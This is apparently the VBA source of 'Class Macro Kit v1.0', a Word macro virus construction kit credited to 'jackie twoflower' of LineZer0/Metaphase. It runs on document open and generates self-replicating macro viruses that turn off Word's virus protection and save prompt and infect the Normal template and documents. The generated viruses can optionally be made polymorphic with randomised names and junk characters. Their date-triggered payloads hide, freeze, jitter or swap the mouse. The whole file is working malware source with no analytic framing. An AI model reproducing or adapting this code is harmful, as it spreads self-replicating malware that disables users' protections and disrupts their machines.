Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1


Public Monate As Integer, Tage As Integer, Payload As Integer
Public PiEActivity As Integer, PiESize As Integer
Public PiEPoly As Boolean, DocOp As Boolean, DocCl As Boolean


Sub AutoOpen()

DocOp = True
Monate = Month(Now()) - 1
Tage = Day(Now()) - 1
PiEActivity = 3
PiESize = 175
Payload = 4

Application.WindowState = wdWindowStateMinimize

frmStart.Show

End Sub

Sub CreateClass(ThaName As String)

On Error Resume Next


Randomize


Dim Variable(25) As String
Dim VirusCode As String
Dim ThePath As String
Dim PiEChar As String
Dim OldLines As Integer

OldLines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

For i = 1 To 25

    Variable(i) = Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22)) & Int(Rnd * 999)

Next

If PiEPoly = True Then PiEChar = Chr(39) Else PiEChar = ""


'            VirusCode = "Rem        -=-=-=-=-=-=-=-=-=-=-=-=- " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem          Class Macro Kit v1.0    " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem        -=-=-=-=-=-=-=-=-=-=-=-=- " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem          Class." & ThaName & "          " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem        -=-=-=-=-=-=-=-=-=-=-=-=- " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem           All code written by    " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem             jackie twoflower     " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem         [LineZer0] & [Metaphase] " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem        -=-=-=-=-=-=-=-=-=-=-=-=- " & PiEChar & vbCr

VirusCode = "Rem Do you see what I see? Do you hear what I hear?" & PiEChar & vbCr
VirusCode = VirusCode & "Rem Do you feel what I feel?" & PiEChar & vbCr
VirusCode = VirusCode & "Rem Do you ever cared?" & PiEChar & vbCr
VirusCode = VirusCode & "Rem                           -jackie twoflower-" & PiEChar & vbCr

Select Case Payload

    Case 0
        
        VirusCode = VirusCode & "Private Declare Function ShowCursor Lib ""USER32"" (ByVal fShow As Integer) As Integer" & PiEChar & vbCr
     
    Case 1
    
        VirusCode = VirusCode & "Private Declare Function SwapMouseButton Lib ""USER32"" (ByVal bSwap As Long) As Long" & PiEChar & vbCr
      
    Case 2
    
        VirusCode = VirusCode & "Private Declare Function SetCursorPos Lib ""USER32"" (ByVal x As Long, ByVal y As Long) As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "Private Declare Function GetCursorPos Lib ""USER32"" (lpPoint As " & Variable(21) & ") As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "Private Declare Sub Sleep Lib ""kernel32"" (ByVal dwMilliseconds As Long)" & PiEChar & vbCr
        VirusCode = VirusCode & "Private Type " & Variable(21) & PiEChar & vbCr
        VirusCode = VirusCode & Variable(22) & " As Long" & PiEChar & vbCr
        VirusCode = VirusCode & Variable(23) & " As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "End Type" & PiEChar & vbCr
       
    Case 3

        VirusCode = VirusCode & "Private Declare Function SetCursorPos Lib ""USER32"" (ByVal x As Long, ByVal y As Long) As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "Private Declare Function GetCursorPos Lib ""USER32"" (lpPoint As " & Variable(21) & ") As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "Private Type " & Variable(21) & PiEChar & vbCr
        VirusCode = VirusCode & Variable(22) & " As Long" & PiEChar & vbCr
        VirusCode = VirusCode & Variable(23) & " As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "End Type" & PiEChar & vbCr
        
End Select

If DocOp = True Then VirusCode = VirusCode & "Private Sub Document_Open()" & PiEChar & vbCr Else VirusCode = VirusCode & "Private Sub Document_Close()" & PiEChar & vbCr
VirusCode = VirusCode & "On Error Resume Next" & PiEChar & vbCr
If PiEPoly = True Then VirusCode = VirusCode & "Dim " & Variable(1) & "(" & PiESize & "):"
VirusCode = VirusCode & "Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0)" & PiEChar & vbCr
VirusCode = VirusCode & "Set " & Variable(2) & " = MacroContainer.VBProject: Set " & Variable(3) & " = " & Variable(2) & ".VBComponents(1)" & PiEChar & vbCr
VirusCode = VirusCode & "Set " & Variable(4) & " = " & Variable(3) & ".CodeModule: Set " & Variable(5) & " = NormalTemplate"
If PiEPoly = True Then VirusCode = VirusCode & ": " & Variable(6) & " = Chr(39)" & PiEChar & vbCr Else VirusCode = VirusCode & PiEChar & vbCr
VirusCode = VirusCode & "If MacroContainer = " & Variable(5) & " Then Set " & Variable(5) & " = ActiveDocument" & PiEChar & vbCr

If PiEPoly = True Then

VirusCode = VirusCode & "Set " & Variable(7) & " = " & Variable(5) & ".VBProject.VBComponents(1).CodeModule: " & Variable(8) & " = " & Variable(4) & ".CountOfLines: " & Variable(9) & " = " & (PiESize - 75) & " + Int(Rnd * 50)" & PiEChar & vbCr
VirusCode = VirusCode & "For " & Variable(10) & " =  1 To " & Variable(8) & ": " & Variable(11) & " = """": " & Variable(12) & " = Int(Rnd * " & PiEActivity & "): " & Variable(13) & " = InStr(" & Variable(4) & ".Lines(" & Variable(10) & ", 1), " & Variable(6) & ")" & PiEChar & vbCr
VirusCode = VirusCode & "If " & Variable(13) & " = 1 And " & Variable(8) & " > " & Variable(9) & " Then " & PiEChar & vbCr
VirusCode = VirusCode & Variable(12) & " = 1: Goto " & Variable(24) & PiEChar & vbCr
VirusCode = VirusCode & "End If" & PiEChar & vbCr

    If Payload = 4 Then
        VirusCode = VirusCode & Variable(14) & " = UCase(Left(" & Variable(4) & ".Lines(" & Variable(10) & ", 1), (" & Variable(13) & " - 1)))" & PiEChar & vbCr
        VirusCode = VirusCode & "For " & Variable(25) & " = 1 To Len(" & Variable(14) & "): " & Variable(15) & " = Mid(" & Variable(14) & ", " & Variable(25) & ", 1)" & PiEChar & vbCr
        VirusCode = VirusCode & "If Asc(" & Variable(15) & ") < 90 and Asc(" & Variable(15) & ") > 65 Then " & Variable(15) & " = Chr(Asc(" & Variable(15) & ") + Int(Rnd * 2) * 32)" & PiEChar & vbCr
        VirusCode = VirusCode & Variable(1) & "(" & Variable(10) & ") = " & Variable(1) & "(" & Variable(10) & ") & " & Variable(15) & ": Next " & Variable(25) & PiEChar & vbCr
        
    Else
    
        VirusCode = VirusCode & Variable(14) & " = Left(" & Variable(4) & ".Lines(" & Variable(10) & ", 1), (" & Variable(13) & " - 1))" & PiEChar & vbCr
        VirusCode = VirusCode & Variable(1) & "(" & Variable(10) & ") = " & Variable(1) & "(" & Variable(10) & ") & " & Variable(14) & PiEChar & vbCr
    
    End If

VirusCode = VirusCode & "For " & Variable(16) & " = 1 To Int(75 - Int(Rnd * 20)): " & Variable(11) & " = " & Variable(11) & " & Chr(255 - Int(Rnd * 100)): Next " & Variable(16) & PiEChar & vbCr
VirusCode = VirusCode & Variable(1) & "(" & Variable(10) & ") = " & Variable(1) & "(" & Variable(10) & ") & " & Variable(6) & " & " & Variable(11) & PiEChar & vbCr
VirusCode = VirusCode & "If " & Variable(12) & " = 2 Then " & Variable(1) & "(" & Variable(10) & ") = " & Variable(1) & "(" & Variable(10) & ") & vbcr & " & Variable(6) & " & " & Variable(11) & PiEChar & vbCr
VirusCode = VirusCode & Variable(17) & " = " & Variable(17) & " & " & Variable(1) & "(" & Variable(10) & ") & vbcr" & PiEChar & vbCr
VirusCode = VirusCode & Variable(24) & ":" & PiEChar & vbCr
VirusCode = VirusCode & "Next " & Variable(10) & PiEChar & vbCr
VirusCode = VirusCode & "If " & Variable(7) & ".CountOfLines < (0 + 2) Then" & PiEChar & vbCr
VirusCode = VirusCode & Variable(7) & ".DeleteLines 1, " & Variable(7) & ".CountOfLines: " & Variable(7) & ".AddFromString " & Variable(17) & PiEChar & vbCr
VirusCode = VirusCode & "If " & Variable(5) & " = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName" & PiEChar & vbCr
VirusCode = VirusCode & "End If" & PiEChar & vbCr

Else

VirusCode = VirusCode & Variable(17) & " = " & Variable(4) & ".Lines(1, " & Variable(4) & ".CountOfLines)" & PiEChar & vbCr
VirusCode = VirusCode & "Set " & Variable(7) & " = " & Variable(5) & ".VBProject.VBComponents(1).CodeModule" & PiEChar & vbCr
VirusCode = VirusCode & "If " & Variable(7) & ".CountOfLines < (0 + 2) Then" & PiEChar & vbCr
VirusCode = VirusCode & Variable(7) & ".DeleteLines 1, " & Variable(7) & ".CountOfLines: " & Variable(7) & ".AddFromString " & Variable(17) & PiEChar & vbCr
VirusCode = VirusCode & "If " & Variable(5) & " = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName" & PiEChar & vbCr
VirusCode = VirusCode & "End If" & PiEChar & vbCr

End If

If Payload <> 4 Then
    
    If Tage <> 0 And Monate <> 0 Then VirusCode = VirusCode & "If Day(Now()) = " & Tage & " And Month(Now()) = " & Monate & " Then" & PiEChar & vbCr
    If Tage <> 0 And Monate = 0 Then VirusCode = VirusCode & "If Day(Now()) = " & Tage & " Then" & PiEChar & vbCr
    If Tage = 0 And Monate <> 0 Then VirusCode = VirusCode & "If Month(Now()) = " & Monate & " Then" & PiEChar & vbCr

End If

Select Case Payload

    Case 0
    
        VirusCode = VirusCode & "While ShowCursor(False) >= 0" & PiEChar & vbCr
        VirusCode = VirusCode & "Wend" & PiEChar & vbCr

    Case 1

        VirusCode = VirusCode & "SwapMouseButton &H2" & PiEChar & vbCr

    Case 2
    
        VirusCode = VirusCode & "Dim " & Variable(18) & " As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "Dim " & Variable(19) & " As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "Dim " & Variable(20) & " As " & Variable(21) & PiEChar & vbCr
        VirusCode = VirusCode & "Do" & PiEChar & vbCr
        VirusCode = VirusCode & "GetCursorPos " & Variable(20) & PiEChar & vbCr
        VirusCode = VirusCode & Variable(18) & " = Rnd(2)" & PiEChar & vbCr
        VirusCode = VirusCode & "If " & Variable(18) & " = 0 Then " & Variable(18) & " = -5 Else " & Variable(18) & " = 5" & PiEChar & vbCr
        VirusCode = VirusCode & Variable(19) & " = Rnd(2)" & PiEChar & vbCr
        VirusCode = VirusCode & "If " & Variable(19) & " = 0 Then " & Variable(19) & " = -5 Else " & Variable(19) & " = 5" & PiEChar & vbCr
        VirusCode = VirusCode & "SetCursorPos " & Variable(20) & "." & Variable(22) & " + " & Variable(18) & ", " & Variable(20) & "." & Variable(23) & " + " & Variable(19) & PiEChar & vbCr
        VirusCode = VirusCode & "Sleep 2" & PiEChar & vbCr
        VirusCode = VirusCode & "DoEvents" & PiEChar & vbCr
        VirusCode = VirusCode & "Loop" & PiEChar & vbCr
    
    Case 3
    
        VirusCode = VirusCode & "Dim " & Variable(20) & " As " & Variable(21) & PiEChar & vbCr
        VirusCode = VirusCode & "GetCursorPos " & Variable(20) & PiEChar & vbCr
        VirusCode = VirusCode & "Do" & PiEChar & vbCr
        VirusCode = VirusCode & "SetCursorPos " & Variable(20) & "." & Variable(22) & ", " & Variable(20) & "." & Variable(23) & PiEChar & vbCr
        VirusCode = VirusCode & "Loop" & PiEChar & vbCr
    
End Select


If Payload <> 4 Then If Tage <> 0 And Monate <> 0 Then VirusCode = VirusCode & "End If" & PiEChar & vbCr

VirusCode = VirusCode & "End Sub" & PiEChar & vbCr
VirusCode = VirusCode & "Rem Another macro bug by jackie twoflower's Class Macro Kit v1.0" & PiEChar

'---------------> Create Document

Documents.Add Template:=NormalTemplate.FullName, Newtemplate:=False

With Dialogs(wdDialogFileSummaryInfo)
    
    .Title = "A wonderful class macro!"
    .Author = "-jackie twoflower/LineZer0/Metaphase-"
    .Comments = "Created by Class Macro Kit v1.0"
    .Execute

End With

ThePath = Options.DefaultFilePath(wdDocumentsPath) & "\" & ThaName & ".doc"

If UCase(Dir(ThePath)) <> UCase((ThaName & ".doc")) Then

    ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString (VirusCode)
    ActiveDocument.SaveAs FileName:=ThePath, fileformat:=wdFormatDocument, addtorecentfiles:=False
    ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges

    MsgBox "Class." & ThaName & " was created in " & ThePath, 64, "CMK v1.0"

Else

    MsgBox "This document already exists!", 16, "CMK Error!"
    ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
    Exit Sub

End If

' This delete code is taken from CPCK by VicodinES. Thanks

If NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines <> OldLines Then

    NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
    NormalTemplate.Save

End If

End Sub

